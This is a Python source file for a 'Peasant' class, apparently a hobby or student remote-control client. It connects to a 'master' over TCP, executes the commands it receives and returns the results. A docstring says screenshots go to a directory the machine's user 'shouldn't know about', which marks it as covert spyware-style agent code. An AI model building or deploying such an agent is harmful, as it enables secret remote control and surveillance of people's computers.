# Tal's Peasant Class
# Version 6 - 14.2.19

import socket
from select import select
from commands import Commands


class Peasant(object):
    def __init__(self, ip='127.0.0.1', port=8220, save_dir='C:\\peasant\\', debug=False):
        """
        Create a new peasant
        :param ip: the ip of the master
        :param port: the port of the master socket
        :param save_dir: (a path to) the directory to save the photos and more. The
               master own directory that the peasant's user shouldn't know about.
        :param debug: debug mode (True-on, False-off)
        """
        # open a TCP\IP socket
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # the masters' ip
        self.__IP = ip
        # the masters' port
        self.__PORT = port
        # a list of all the responses to send to the master
        self.__responses = []
        # the path to the dir to save all the screenshots
        self.__save_dir = save_dir
        # current working directory
#        self.__cwd = 'C:\\'
        # debug mode
        self.__DEBUG = debug

    def __receive_request(self):
        """
        Receives the full message sent by the master.
        :return: keep alive
        """
        # get the request's length
        request_size = self.__socket.recv(Commands.SIZE_LENGTH)
        # if the master sent an empty msg, then he has closed himself
        if not request_size:
            print "Master Has Been Closed"
            # TODO: close the peasant and start the run function all over again
            return 0
        # fix the request's length
        request_size = int(request_size) - Commands.COMMAND_LENGTH
        # get the request's command's number
        command = int(self.__socket.recv(Commands.COMMAND_LENGTH))
        # if the request size's is 0, then there are not args
        args = []
        # else, there are args, read them
        if request_size != 0:
            args = self.__socket.recv(request_size).split(Commands.SEPARATE_CHAR)

        # handle the command and add the command number and return value to the responses list
        self.__responses.append(str(command) + Commands.handle_command_request(command, args))
        return 1

    def __send_responses(self):
        """
        Sends all the responses to the master.
        :return: nothing, void.
        """
        # create a copy of the responses
        responses = self.__responses
        # for every response
        for response in responses:
            if self.__DEBUG:
                print "Sending the following response to the master:\n"
                print str(response)
            # get the response's length
            length = Commands.pad_length(len(response))
            # send the master the response
            self.__socket.send(length+response)
            # remove the response from the responses' list
            if response in self.__responses:
                self.__responses.remove(response)

    def run(self):
        """
        Runs the peasant - connect to the master and receive commands,
        execute them and send results to the master.
        :return: nothing, void.
        """
        # try to connect to the master until successfully connected
        while True:
            try:
                print "Connecting"
                self.__socket.connect((self.__IP, self.__PORT))
            except socket.timeout:
                continue
            else:
                break
        print "CONNECTED!"

        # the master command
        command = ""
        # while the master didn't close the connection with the peasant
        # and there aren't any requests to handle
        # and there aren't any responses to send to the master
        while not command.upper() == 'EXIT':
            # select - check if can receive or send to the master
            rlist, wlist, xlist = select([self.__socket], [self.__socket], [])

            # if can receive from the master a command
            if self.__socket in rlist:
                # receive the master's request
                self.__receive_request()

            # if can send responses to the master, send them.
            if self.__socket in wlist:
                # send the response to the master
                self.__send_responses()

        # close the connection and the socket
        self.__socket.close()


if __name__ == '__main__':
    # create a new peasant
    peasant = Peasant()
    # run the peasant
    peasant.run()
